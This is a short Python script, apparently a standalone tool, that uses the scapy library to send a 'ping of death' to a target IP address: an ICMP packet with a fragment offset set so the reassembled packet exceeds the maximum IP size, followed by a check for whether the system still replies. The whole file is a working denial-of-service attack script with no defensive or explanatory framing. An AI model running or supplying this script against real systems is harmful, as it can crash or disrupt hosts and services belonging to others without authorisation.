from scapy.all import *

def pingofdeath(targetip, timeout):
    payload = "abcdef" * 100
    packet = IP(dst=targetip, off=65528) / ICMP() / payload
    reply = sr(packet, timeout=timeout, verbose=0)
    if reply is None:
        print("No reply")
    else:
        print("System replied")

